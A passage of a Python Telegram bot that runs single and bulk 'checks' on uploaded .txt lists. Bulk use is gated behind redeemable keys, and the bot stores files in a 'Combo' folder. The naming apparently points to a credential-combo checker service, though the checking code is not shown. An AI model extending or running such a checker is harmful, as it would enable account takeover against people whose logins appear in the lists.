        cmd_check_single(message)
    else:
        us = get_user_session(user_id)
        if us.is_running:
            bot.send_message(message.chat.id, "⚠️ A check is already running. Use /stop first.")
            return
        if not us.bulk_key:
            bot.send_message(message.chat.id, "🔐 Bulk check requires a key. Use /redeem or /bulk first.")
            return
        run_bulk_check(message.chat.id, user_id, lines)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not message.document.file_name.endswith('.txt'):
        bot.send_message(message.chat.id, "⚠️ Only .txt files are accepted. Use /file command.")
        return
    user_id = message.from_user.id
    us = get_user_session(user_id)
    if not us.bulk_key:
        bot.send_message(message.chat.id, "🔐 Please redeem a key first using /redeem or provide it via /file.")
        return
    process_file_upload(message)

def main():
    os.makedirs('Combo', exist_ok=True)
    print("Bot is running with key system...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)

if __name__ == "__main__":
    main()